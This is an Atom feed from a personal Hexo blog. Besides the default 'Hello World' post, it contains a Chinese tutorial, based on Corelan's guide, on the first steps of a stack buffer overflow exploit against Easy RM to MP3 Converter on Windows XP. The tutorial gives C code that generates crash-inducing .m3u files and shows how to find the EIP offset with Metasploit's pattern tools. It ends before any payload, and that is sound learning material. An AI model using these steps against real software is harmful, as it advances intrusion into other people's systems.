<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>PCB博客</title>
  <subtitle>快乐记录每一天</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bin2415.github.io/"/>
  <updated>2017-05-16T02:07:04.292Z</updated>
  <id>http://bin2415.github.io/</id>
  
  <author>
    <name>binpang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://bin2415.github.io/2017/05/16/hello-world/"/>
    <id>http://bin2415.github.io/2017/05/16/hello-world/</id>
    <published>2017-05-16T02:07:04.292Z</published>
    <updated>2017-05-16T02:07:04.292Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ExploitTutorial</title>
    <link href="http://bin2415.github.io/2016/04/13/ExploitTutorial/"/>
    <id>http://bin2415.github.io/2016/04/13/ExploitTutorial/</id>
    <published>2016-04-13T07:27:07.000Z</published>
    <updated>2017-05-16T07:35:56.282Z</updated>
    
    <content type="html"><![CDATA[<h3 id="声明：本博客是根据Exploit该链接所写"><a href="#声明：本博客是根据Exploit该链接所写" class="headerlink" title="声明：本博客是根据Exploit该链接所写"></a>声明：本博客是根据<a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="external">Exploit</a>该链接所写</h3><hr>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul>
<li>实验环境：windows xp windows xp sp3</li>
<li></li>
<li>下载easyRmtomp3.exe,下载地址：<a href="https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe" target="_blank" rel="external">https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe</a></li>
</ul>
<hr>
<h3 id="使程序crash"><a href="#使程序crash" class="headerlink" title="使程序crash"></a>使程序crash</h3><ul>
<li>编写一个程序生成10000个字符，可以使程序crash，程序如图所示</li>
</ul>
<p><img src="http://i.imgur.com/mwATA96.png" alt="图1"></p>
<ul>
<li>crash的程序如下图所示：</li>
</ul>
<p><img src="http://i.imgur.com/20ltmX6.png" alt="图2"></p>
<p>但没有出现崩溃，可见改程序采取了保护措施，将A的数量增加，增加到20000时，也不会崩溃，当增加到30000时，程序崩溃。如图所示：</p>
<p><img src="http://i.imgur.com/IVtRxc0.png" alt="图3"></p>
<p>会出现地址指针EIP指向0x41414141地址，由于找不到改地址所以该程序会发生崩溃。</p>
<hr>
<h3 id="栈信息介绍"><a href="#栈信息介绍" class="headerlink" title="栈信息介绍"></a>栈信息介绍</h3><p>栈的信息如下图所示：</p>
<p><img src="http://i.imgur.com/mGAjPTR.png" alt="图4"></p>
<hr>
<h3 id="确定return的地址偏移"><a href="#确定return的地址偏移" class="headerlink" title="确定return的地址偏移"></a>确定return的地址偏移</h3><ul>
<li>构造buffer字符串，生成25000个’A’和5000个’B’时，观察EIP的数值<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt; </div><div class="line"></div><div class="line">int main() </div><div class="line">&#123; </div><div class="line">    </div><div class="line"> FILE* fp = NULL; </div><div class="line"> </div><div class="line">   fp = fopen(&quot;crash2.m3u&quot;,&quot;w+&quot;);</div><div class="line">    </div><div class="line">    int i = 0;</div><div class="line">    if(fp == NULL)</div><div class="line">    return;</div><div class="line">    for(i;i &lt; 25000; i++)</div><div class="line">    &#123;</div><div class="line">        fprintf(fp,&quot;\x41&quot;);</div><div class="line">    &#125;</div><div class="line">    for(i = 0; i &lt; 5000; i++)</div><div class="line">    &#123;</div><div class="line">        fprintf(fp, &quot;\x42&quot;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>调试结果如图所示：</p>
<p><img src="http://i.imgur.com/ZXmeTz4.png" alt=""></p>
<p>可以知道EIP为0x42424242,所以return地址偏移在25000和30000之间</p>
<ul>
<li>测试eip的offset具体在什么位置</li>
</ul>
<p>利用metasploit的工具测试具体在什么位置，具体如下：cd metasplot-framework/tools</p>
<p>./pattern_create.rb 5000 &gt; mima.txt 生成5000大小的字符串并输出到mima.txt文件</p>
<p>构建前25000个为A，后5000个位mima.txt为内容的.m3u文件，如图所示：</p>
<p><img src="http://i.imgur.com/lsg0d4l.png" alt=""></p>
<p>得到的eip结果如下图所示：</p>
<p><img src="http://i.imgur.com/WTx76bu.png" alt=""></p>
<p>可知eip的值为0x42316A42</p>
<p>然后利用metasploit工具找到具体是什么位置，命令如下：.pattern_offset.rb 0x423116A42 5000,得到结果为1053</p>
<p>测试一下1053是否正确，编写如下程序：</p>
<p><img src="http://i.imgur.com/27N33ZK.png" alt=""></p>
<p>运行测试一下，结果如下图：</p>
<p><img src="http://i.imgur.com/BIIpz22.png" alt=""></p>
<p>可以看到eip指向的是0x42424242，所以找到的return的地址偏移是正确的</p>
<hr>
<h3 id="该教程先写到这，有空再继续-＾－＾-V"><a href="#该教程先写到这，有空再继续-＾－＾-V" class="headerlink" title="该教程先写到这，有空再继续(＾－＾)V"></a>该教程先写到这，有空再继续(＾－＾)V</h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;声明：本博客是根据Exploit该链接所写&quot;&gt;&lt;a href=&quot;#声明：本博客是根据Exploit该链接所写&quot; class=&quot;headerlink&quot; title=&quot;声明：本博客是根据Exploit该链接所写&quot;&gt;&lt;/a&gt;声明：本博客是根据&lt;a href=&quot;https
    
    </summary>
    
    
      <category term="Exploit" scheme="http://bin2415.github.io/tags/Exploit/"/>
    
      <category term="反汇编" scheme="http://bin2415.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
</feed>
